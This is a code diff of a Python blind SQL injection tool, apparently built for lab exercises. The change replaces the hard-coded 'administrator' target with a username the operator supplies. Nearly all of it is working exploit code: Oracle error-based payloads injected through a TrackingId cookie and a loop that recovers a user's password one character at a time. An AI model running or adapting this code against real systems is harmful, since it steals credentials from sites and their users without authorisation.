@@ -12,13 +12,13 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 # Proxies configuration
 proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
 
-def blind_sqli_with_error_response(url, base_trackingid, session_cookie):
+def blind_sqli_with_error_response(url, username, base_trackingid, session_cookie):
     # This is the existing function for option 3 (Blind SQLi with error response)
     password_extracted = ""
     
     for i in range(1, 21):  # Assuming password length up to 20 characters
         for j in range(32, 126):  # ASCII range for printable characters
-            sqli_payload = "' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator' AND ascii(SUBSTR(password,%s,1))='%s') || '" % (i, j)
+            sqli_payload = "' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='%s' AND ascii(SUBSTR(password,%s,1))='%s') || '" % (username, i, j)
             sqli_payload_encoded = urllib.parse.quote(sqli_payload)
             
             cookies = {
@@ -44,12 +44,12 @@ def blind_sqli_with_error_response(url, base_trackingid, session_cookie):
 
     print("\nDebug: Password extraction completed for error response. Final extracted: " + password_extracted)
 
-def blind_sqli(url, base_trackingid, session_cookie):
+def blind_sqli(url, username, base_trackingid, session_cookie):
     # New function for option 2 (Blind SQLi, based on original code)
     password_extracted = ""
     
     def check_ascii(i, j):
-        sqli_payload = "' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator' AND ascii(SUBSTR(password,%s,1))='%s') || '" % (i, j)
+        sqli_payload = "' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='%s' AND ascii(SUBSTR(password,%s,1))='%s') || '" % (username, i, j)
         sqli_payload_encoded = urllib.parse.quote(sqli_payload)
         
         cookies = {
@@ -101,15 +101,17 @@ def main():
     elif choice == '2':
         print("Running Blind SQLi...")
         url = input("Enter the URL: ")
-        base_trackingid = input("Enter the base TrackingId (e.g., x1mQGV90K7xWjGId): ")
-        session_cookie = input("Enter the session cookie (e.g., LxQM2LkrDIs73aGqZZYJpaGgKRLxc7q9): ")
-        blind_sqli(url, base_trackingid, session_cookie)
+        username = input("Enter the username: ")
+        base_trackingid = input("Enter the base TrackingId: ")
+        session_cookie = input("Enter the session cookie: ")
+        blind_sqli(url, username, base_trackingid, session_cookie)
     elif choice == '3':
         print("Running Blind SQLi with error response...")
         url = input("Enter the URL: ")
-        base_trackingid = input("Enter the base TrackingId (e.g., x1mQGV90K7xWjGId): ")
-        session_cookie = input("Enter the session cookie (e.g., LxQM2LkrDIs73aGqZZYJpaGgKRLxc7q9): ")
-        blind_sqli_with_error_response(url, base_trackingid, session_cookie)
+        username = input("Enter the username: ")
+        base_trackingid = input("Enter the base TrackingId: ")
+        session_cookie = input("Enter the session cookie: ")
+        blind_sqli_with_error_response(url, username, base_trackingid, session_cookie)
     else:
         print("Invalid choice. Please run the program again and select 1, 2, or 3.")
 
